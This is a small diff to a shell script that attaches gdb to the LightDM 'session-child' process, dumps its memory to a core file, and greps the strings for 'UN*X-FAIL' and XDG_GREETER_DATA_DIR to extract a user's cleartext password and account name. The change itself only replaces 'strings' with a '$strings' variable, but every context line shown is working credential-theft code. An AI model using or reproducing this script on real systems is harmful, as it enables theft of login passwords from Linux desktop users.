@@ -19,7 +19,7 @@ commands="commands.txt"
 lightdm_pid=$(ps aux |grep 'lightdm --session-child' |grep -v grep |awk '{print $2}')
 $gdb -p $lightdm_pid -x $commands --batch-silent 2>/dev/null
 
-strings /tmp/core_file > /tmp/core_strings
+$strings /tmp/core_file > /tmp/core_strings
 password=$(cat /tmp/core_strings | grep 'UN\*X-FAIL' -A1 |grep -v '\-UN\*X-FAIL')
 account=$(cat /tmp/core_strings | grep 'XDG_GREETER_DATA_DIR' -A0 |cut -f6 -d"/" |sort -u)
 
